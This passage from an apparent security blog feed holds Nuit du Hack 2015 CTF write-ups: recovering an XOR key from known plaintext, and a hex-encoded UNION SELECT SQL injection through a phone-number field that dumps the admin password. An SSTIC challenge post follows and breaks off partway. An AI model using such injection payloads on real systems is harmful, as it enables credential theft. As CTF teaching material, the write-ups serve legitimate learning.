            &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;


&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Content-Type: text/html&amp;#39;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;amp;lt;!DOCTYPE html&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;amp;lt;html&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;amp;lt;head&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;amp;lt;title&amp;amp;gt;Updator - Update system&amp;amp;lt;/title&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;static/font-awesome/css/font-awesome.css&amp;quot;&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;static/css/style.css&amp;quot;&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;amp;lt;/head&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;amp;lt;body&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;amp;lt;div id=&amp;quot;info&amp;quot;&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;      The update managing system is still under construction but will be available soon.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;amp;lt;/div&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;amp;lt;/body&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;amp;lt;/html&amp;amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;The private key&lt;/h3&gt;
&lt;p&gt;We know the algorithm use to encrypt the &lt;code&gt;log.py.encypted&lt;/code&gt; file: a XOR cipher by
bloc of 8 characters where the preceding bloc is also XOR with the current one.
We just need the key. Bruteforcing 8 characters will be too long, we need an
other method. The &lt;code&gt;log.py.encypted&lt;/code&gt; file being python code will probably start
by something like &lt;code&gt;import sys&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First of all lets take a closer look to &lt;code&gt;log.py.encrypted&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine updator]$ hexdump -C log.py.encrypted
00000000  5f 36 30 0b 03 56 06 17  08 19 15 1b 1b 19 45 6e  |_60..V........En|
00000010  34 0e 1a 38 35 7f 2a 4f  22 68 7a 7b 28 32 6b 4f  |4..85.*O&amp;quot;hz{(2kO|
00000020  33 39 30 7c 35 71 3e 4f  25 2e 1f 7f 23 36 6a 14  |390|5q&amp;amp;gt;O%...#6j.|
00000030  3a 4f 55 11 72 34 6c 47  4c 67 61 14 77 7f 29 59  |:OU.r4lGLga.w.)Y|
00000040  1f 48 49 1f 62 57 2f 0a  09 33 6d 1e 75 55 65 16  |.HI.bW/..3m.uUe.|
00000050  58 40 58 09 61 05 2d 04  03 7e 34 4d 60 46 78 04  |X@X.a.-..~4M`Fx.|
00000060  42 4a 06 4d 38 5e 54 57  54 31 66 09 69 5c 52 46  |BJ.M8^TWT1f.i\RF|
00000070  03 19 43 03 79 13 11 15  08 62 24 42 7b 1e 12 15  |..C.y....b$B{...|
00000080  61 1c 17 01 2a 19 14 4e  1b 08 10 3a 1f 72 60 11  |a...*..N...:.r`.|
00000090  0d 20 24 2c 46 34 27 16  5e 0f 0d 25 52 38 65 04  |. $,F4&amp;#39;.^..%R8e.|
000000a0  1c 31 63 35 4c 7e 22 0e  02 43 0a 7d 1d 29 77 18  |.1c5L~&amp;quot;..C.}.)w.|
000000b0  46 76 2b 74 09 22 5b 4b  50 0d 4b 30 58 20 5d 4f  |Fv+t.&amp;quot;[KP.K0X ]O|
000000c0  0f 22 63 74 46 72 1e 52  11 1b 42 63 52 3e 59 4c  |.&amp;quot;ctFr.R..BcR&amp;amp;gt;YL|
000000d0  42 6c 22 20 42 37 58 16  54 56 11 64 55 71 44 6f  |Bl&amp;quot; B7X.TV.dUqDo|
000000e0  42 2d 71 20 04 73 42 3c  54 56 11 64 13 35 4a 38  |B-q .sB&amp;amp;lt;TV.d.5J8|
000000f0  10 64 25 65 4a 30 37 6e  55 62 45 4d 54 75 78 73  |.d%eJ07nUbEMTuxs|
00000100  43 4e 6c 5d 4d 77 2e 61  06 66 5b 56 4e 31 28 37  |CNl]Mw.a.f[VN1(7|
00000110  43 61 75 15 1f 36 2e 6c  06 4e 47 59 0a 75 7c 7a  |Cau..6.l.NGY.u|z|
00000120  44 7c 6a 58 55 33 3b 7d  17 53 43 51 41 3f 69 61  |D|jXU3;}.SCQA?ia|
00000130  45 69 7a 1d 19 34 63 32  03 53 49 0a 1f 79 37 25  |Eiz..4c2.SI..y7%|
00000140  1c 21 03 5e 5e 6b 21 66                           |.!.^^k!f|
00000148
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;XOR being a symmetric algorithm we just need to XOR the first octet of the file
with the word &lt;code&gt;import s&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x5f^ord(&amp;#39;i&amp;#39;))
&amp;#39;6&amp;#39;
&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x36^ord(&amp;#39;m&amp;#39;))
&amp;#39;[&amp;#39;
&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x30^ord(&amp;#39;p&amp;#39;))
&amp;#39;@&amp;#39;
&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x0b^ord(&amp;#39;o&amp;#39;))
&amp;#39;d&amp;#39;
&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x03^ord(&amp;#39;r&amp;#39;))
&amp;#39;q&amp;#39;
&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x56^ord(&amp;#39;t&amp;#39;))
&amp;#39;&amp;quot;&amp;#39;
&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x06^ord(&amp;#39; &amp;#39;))
&amp;#39;&amp;amp;amp;&amp;#39;
&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x17^ord(&amp;#39;s&amp;#39;))
&amp;#39;d&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We decipher the file with the key &lt;strong&gt;6[@dq"&amp;amp;d&lt;/strong&gt; and obtain the following first
line:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;satetime&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The first line of our file was not &lt;code&gt;import sys&lt;/code&gt; but &lt;code&gt;import datetime&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;amp;gt;&amp;amp;gt;&amp;amp;gt; chr(0x17^ord(&amp;#39;d&amp;#39;))
&amp;#39;s&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;The logs file&lt;/h3&gt;
&lt;p&gt;We decipher the file with the key &lt;strong&gt;6[@dq"&amp;amp;s&lt;/strong&gt; and obtain the following file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;

&lt;span class="n"&gt;LOG_DIR&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;logs&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Logger&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;basename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;_&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LOG_DIR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;today&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a+&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;] Login with password &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;today&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We see that the logs of the application are in a file like
&lt;code&gt;/logs/date_username/&lt;/code&gt; with the date in the format YYYY-MM-DD.&lt;/p&gt;
&lt;p&gt;We go to the URL http://updator.challs.nuitduhack.com/logs/2015-04-04_admin to
see the logs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf
[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We now have the credentials to log ourself in the interface and get the flag.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag: zEpbiUFt5p7m84cxOxN6&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Raptor&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;Thank to &lt;a href="https://twitter.com/_plo_"&gt;Plo&lt;/a&gt; who redact this WRITUP before me.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Misc   \   400 points      http://quals.nuitduhack.com/challenges/view/12&lt;/p&gt;
&lt;h2&gt;Statement&lt;/h2&gt;
&lt;p&gt;No statement, nothing except a link: raptor.challs.nuitduhack.com:4142&lt;/p&gt;
&lt;h2&gt;Challenge&lt;/h2&gt;
&lt;p&gt;We connect ourself to the port and the address:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[plo@hyperion Misc]$ nc raptor.challs.nuitduhack.com 4142
~ Â» Welcome to the Raptor/1.0 Information Exchange Server
~ Â» You are anonymous - Read only access !
Available commands :
+----------+-----------------+-------------------------------+--------------------------------+
| Command  | Required Access |             Syntax            |              Help              |
+----------+-----------------+-------------------------------+--------------------------------+
|   AUTH   |      guest      |    AUTH [login] [password]    |     Connect to an account      |
|   LIST   |       user      |       LIST [maxrecords]       |    List users informations     |
|  SEARCH  |       user      | SEARCH [pattern] [maxresults] |         Search an user         |
|  RSHELL  |      admin      |             RSHELL            |    Migrate to Raptor Shell     |
| VERSION  |      guest      |            VERSION            |  Show current Raptor version   |
| REGISTER |      guest      |            REGISTER           |     Register a new account     |
|   HELP   |      guest      |            VERSION            |      Show this help menu       |
|  RIGHTS  |      guest      |             RIGHTS            |   Print your current rights    |
| HISTORY  |       user      |            HISTORY            |     Show your call history     |
|  RESET   |      guest      |             RESET             | ROLLBACK ! (Reset the CTF DB.) |
|   QUIT   |      guest      |              QUIT             |     Close the connection.      |
+----------+-----------------+-------------------------------+--------------------------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We are connected to the Raptor service as guest.&lt;/p&gt;
&lt;p&gt;The output format seems to be a database. A SQL request could return this
output. The Raptor service got 3 level of rights: guest, user and admin and the
only command restricted to the admin right is &lt;code&gt;RSHELL&lt;/code&gt;. When continuing to
discover the commands, we notice that the &lt;code&gt;_&lt;/code&gt; and &lt;code&gt;%&lt;/code&gt; SQL wildcards characters
work directly out of the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;guest ~ $ SEARCH %
+-----------+---------------+-----------+--------+
| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |
+-----------+---------------+-----------+--------+
|   Wesley  |   Eshmaggle   |    4412   | admin  |
|    Yvan   |    Delacam    |    0452   |  user  |
|    Yvon   |     Payrir    |     A     |  user  |
|   Zlatan  | Ibrahimovitch |    5122   |  user  |
+-----------+---------------+-----------+--------+

guest ~ $ SEARCH _
+-----------+---------------+-----------+--------+
| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |
+-----------+---------------+-----------+--------+
|   Wesley  |   Eshmaggle   |    4412   | admin  |
|    Yvan   |    Delacam    |    0452   |  user  |
|    Yvon   |     Payrir    |     A     |  user  |
|   Zlatan  | Ibrahimovitch |    5122   |  user  |
+-----------+---------------+-----------+--------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Moreover, the user Yvon Payrir as a DESKPHONE &lt;strong&gt;A&lt;/strong&gt;.
We create an account to check if we can put directly a letter as DESKPHONE:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;guest ~ $ REGISTER
Please fill the informations below :

Login : a
Firstname : a
Lastname : a
Contact (DESK PHONE) : TEST
/!\ ERROR ! INVALID DESKPHONE NUMBER !
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is not directly possible, we then used the hexadecimal value of TEST:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;guest ~ $ REGISTER
Please fill the informations below :

Login : a
Firstname : a
Lastname : a
Contact (DESK PHONE) : 0x54455354
Password : zenk
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !

guest ~ $ SEARCH %
+-----------+---------------+-----------+--------+
| FIRSTNAME |    LASTNAME   | DESKPHONE | RIGHTS |
+-----------+---------------+-----------+--------+
|     a     |       a       |    TEST   |  user  |
|   Wesley  |   Eshmaggle   |    4412   | admin  |
|    Yvan   |    Delacam    |    0452   |  user  |
|    Yvon   |     Payrir    |     A     |  user  |
|   Zlatan  | Ibrahimovitch |    5122   |  user  |
+-----------+---------------+-----------+--------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(We can notice that the password is "Encrypted" with 128 ROT13 which is plain
text as ROT13 is symmetric).
We can inject anything in the DESKPHONE filed.&lt;/p&gt;
&lt;p&gt;One of the command is &lt;code&gt;HISTORY&lt;/code&gt;. This command list the calls history for a given
user. The coincidence is great as we can inject data in the DESKPHONE field:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;a ~ $ HISTORY
RAPTOR CALL REPORTING
- CLIENT INFO :

+-----------+------+
|  USERNAME |  a   |
|   RIGHTS  | user |
| DESKPHONE | TEST |
+-----------+------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If we put an existing number as DESKPHONE, the &lt;code&gt;HISTORY&lt;/code&gt; command show us the
history of an other user. It seems to be a simple SQL injection in hexadecimal.
We try to get some informations about the database (the SQL command is in the
DESKPHONE filed):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;guest ~ $ REGISTER
Please fill the informations below :

Login : d
Firstname : d
Lastname : d
Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354207461626c655f736368656d612c7461626c655f6e616d652c636f6c756d6e5f6e616d652c6e756c6c2046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73
Password : zenk
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !

d ~ $ HISTORY
RAPTOR CALL REPORTING
- CLIENT INFO :

+-----------+-----------------------------------------------------------------------------------------+
|  USERNAME |                                            d                                            |
|   RIGHTS  |                                           user                                          |
| DESKPHONE | 1 UNION SELECT table_schema,table_name,column_name,null FROM information_schema.columns |
+-----------+-----------------------------------------------------------------------------------------+

 - CALL HISTORY

+--------------------+---------------------------------------+----------------------------------+----------+
|         ID         |                  DATE                 |           DESTINATION            | DURATION |
+--------------------+---------------------------------------+----------------------------------+----------+
| information_schema |             CHARACTER_SETS            |        CHARACTER_SET_NAME        |   None   |
| [...]              |             [...]                     |        [...]                     |   None   |
|    x_8816665166    |                 users                 |                id                |   None   |
|    x_8816665166    |                 users                 |            firstname             |   None   |
|    x_8816665166    |                 users                 |               name               |   None   |
|    x_8816665166    |                 users                 |             contact              |   None   |
|    x_8816665166    |                 users                 |             password             |   None   |
|    x_8816665166    |                 users                 |              login               |   None   |
|    x_8816665166    |                 users                 |              rights              |   None   |
+--------------------+---------------------------------------+----------------------------------+----------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We get the admin password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;guest ~ $ REGISTER
Please fill the informations below :

Login : i
Firstname : i
Lastname : i
Contact (DESK PHONE) : 0x3120554e494f4e2053454c454354206c6f67696e2c70617373776f72642c7269676874732c6e756c6c2046524f4d207573657273205748455245207269676874733d2761646d696e27
Password : i
Encrypting using 128x(ROT13) ......HAAAAAAAAX......
Password encryption done ! (Security First) !

i ~ $ HISTORY
RAPTOR CALL REPORTING
- CLIENT INFO :

+-----------+---------------------------------------------------------------------------+
|  USERNAME |                                     i                                     |
|   RIGHTS  |                                    user                                   |
| DESKPHONE | 1 UNION SELECT login,password,rights,null FROM users WHERE rights=&amp;#39;admin&amp;#39; |
+-----------+---------------------------------------------------------------------------+

 - CALL HISTORY

+-------------+------------+-------------+----------+
|      ID     |    DATE    | DESTINATION | DURATION |
+-------------+------------+-------------+----------+
| w.eshmaggle | Hanlbatard |    admin    |   None   |
+-------------+------------+-------------+----------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We login as the admin user and user the &lt;code&gt;RSHELL&lt;/code&gt; command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;guest ~ $ AUTH w.eshmaggle Hanlbatard
Welcome w.eshmaggle !
w.eshmaggle ~ $ RSHELL
Ok, ok good job. You are admin... The flag is : 0eb80d9c2cdee95b461cf0b70d40791f
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Flag: 0eb80d9c2cdee95b461cf0b70d40791f&lt;/strong&gt;&lt;/p&gt;</content><category term="ndh"></category><category term="ctf"></category><category term="security"></category></entry><entry><title>First April SSTIC challenge</title><link href="https://matthieukeller.com/2015/04/first-april-sstic-challenge.html" rel="alternate"></link><published>2015-04-02T00:00:00+02:00</published><updated>2015-04-02T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-04-02:/2015/04/first-april-sstic-challenge.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.04/sstic_res_750.PNG"
alt="pixel view, resolution 750" width="172"&gt;&lt;/p&gt;
&lt;p&gt;The first of April is always the occasion for some great pranks.
2015 was a great year, as the CERN confirmed the existence of the Force, Google
published a mirroring website and gentoo an old fashion one.
In France we got a security event call &lt;a href="https://www.sstic.org"&gt;SSTIC&lt;/a&gt; for which
the tickets are very rare therefore the SSTIC challenge allows the ones with the
flag to reserve a ticket. An April prank challenge was post yesterday.
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.04/sstic_res_750.PNG"
alt="pixel view, resolution 750" width="172"&gt;&lt;/p&gt;
&lt;p&gt;The first of April is always the occasion for some great pranks.
2015 was a great year, as the CERN confirmed the existence of the Force, Google
published a mirroring website and gentoo an old fashion one.
In France we got a security event call &lt;a href="https://www.sstic.org"&gt;SSTIC&lt;/a&gt; for which
the tickets are very rare therefore the SSTIC challenge allows the ones with the
flag to reserve a ticket. An April prank challenge was post yesterday.
&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;/p&gt;
&lt;h1&gt;April Pranks&lt;/h1&gt;
&lt;p&gt;The first of April is always the occasion for some great pranks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://twitter.com/CERN/status/583147747710263296"&gt;CERN confirm the existence of the Force&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="CERN tweet about the Force" src="/media/2015.04/twitter.com_CERN_status_583147747710263296.PNG"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://com.google"&gt;Google do some mirroring trick&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="com.google mirrored" src="/media/2015.04/com.google.PNG"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://gentoo.org"&gt;gentoo.org adopted a beautiful design&lt;/a&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="gentoo.org old school" src="/media/2015.04/gentoo.org.PNG"&gt;&lt;/p&gt;
&lt;h1&gt;SSTIC Challenge&lt;/h1&gt;
&lt;p&gt;But one of them was released by the &lt;a href="https://www.sstic.org"&gt;SSTIC&lt;/a&gt; an French
security event which give every year a difficult challenge that grant
automatically a place to the event (tickets are sold out in approximately one
minute) for the winners.&lt;/p&gt;
&lt;p&gt;We download the challenge (I got a backup &lt;a href="/media/2015.04/chlg-2015"&gt;here&lt;/a&gt; just
in case):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://static.sstic.org/challenge2015/chlg-2015
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Strings&lt;/h2&gt;
&lt;p&gt;Let's try something like &lt;code&gt;strings&lt;/code&gt; to see what appends:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;maggick@debian:~/work/sstic$ strings chlg-2015 | wc -l
10797

maggick@debian:~/work/sstic$ strings chlg-2015 | head
Salted__D
8&amp;#39;&amp;amp;lt;K
vKRbn
vKRbn
vKRbn
vKRbn
K5G--9S
%Pz$
vKRbn
vKRb
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No chance coming from here.&lt;/p&gt;
&lt;h2&gt;Hexview&lt;/h2&gt;
&lt;p&gt;We use radare2 to see the hexcode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[0x00000000 0% 1008 chlg-2015]&amp;amp;gt; x
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00000000  5361 6c74 6564 5f5f 4419 80b6 425f d4ff  Salted__D...B_..
0x00000010  1e5c 83a1 c4d7 24f5 4697 9aac 2571 5f8e  .\....$.F...%q_.
0x00000020  64e2 52ad 8947 119e c4ad 929b 6505 4de2  d.R..G......e.M.
0x00000030  ff44 0add d438 273c 4b8d 760d 416d c883  .D...8&amp;#39;&amp;amp;lt;K.v.Am..
0x00000040  290e 8014 1ce7 88a2 b6c7 cd00 d8e9 98bd  )...............
0x00000050  e40c cb76 4b52 626e 0ee0 c966 b1c8 c24b  ...vKRbn...f...K
0x00000060  e40c cb76 4b52 626e 0ee0 c966 b1c8 c24b  ...vKRbn...f...K
0x00000070  4915 cd03 153c 5210 abe7 c68f c882 f198  I....&amp;amp;lt;R.........
0x00000080  f153 28d9 ef43 0ecc d38a 8cc7 7cff 5351  .S(..C......|.SQ
0x00000090  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x000000a0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x000000b0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x000000c0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x000000d0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x000000e0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x000000f0  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x00000100  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x00000110  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x00000120  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x00000130  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x00000140  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
0x00000150  ad07 b6ef c462 dffe ad31 8a95 01a1 4390  .....b...1....C.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yeah that a message encrypt with open ssl and salt. But we do not have any idea
about the key nor the salt. Shall we take a look at the code itself:&lt;/p&gt;
